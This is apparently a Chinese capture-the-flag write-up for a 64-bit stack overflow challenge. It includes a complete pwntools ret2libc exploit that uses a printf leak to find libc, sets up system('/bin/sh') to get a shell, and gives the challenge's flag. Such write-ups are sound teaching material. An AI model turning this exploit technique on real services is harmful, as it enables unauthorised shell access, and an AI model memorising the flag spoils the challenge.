# handson-004

## 题目简述

程序与上一题相同地对 8 字节栈缓冲区调用 `gets`，但不再提供 `win`。NX 开启、无 canary、主程序非 PIE，并随题提供配套 libc；程序先泄露运行时 `printf` 地址，因此可以计算 libc 基址并构造 ret2libc 调用 `system("/bin/sh")`。

## 解题过程

先读取泄露并减去配套 libc 中 `printf` 的符号偏移：

```python
from pwn import ELF, ROP, context, p64, process

exe = context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = "./ld-linux-x86-64.so.2"
io = process([ld, "--library-path", ".", exe.path])

io.recvuntil(b"Here's a libc leak for you: ")
printf_leak = int(io.recvline(), 16)
libc.address = printf_leak - libc.sym["printf"]

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = ROP(exe).find_gadget(["ret"])[0]
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * 8 + p64(0)
payload += p64(ret)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(libc.sym["system"])

io.sendlineafter(b"Enter input: ", payload)
io.sendline(b"cat flag.txt")
print(io.recvline().decode())
```

偏移仍是 16 字节；额外的 `ret` 用于栈对齐。获得 shell 后读取：

```text
flag{gadget_here_gadget_there_gadget_everywhere}
```

## 方法总结

当目标没有现成成功函数、但给出 libc 泄露和对应库文件时，应优先计算 `libc_base = leak - symbol_offset`，再定位 `pop rdi; ret`、`/bin/sh` 和 `system`。不要把一次运行中的绝对地址硬编码进脚本；应始终基于泄露重定位。
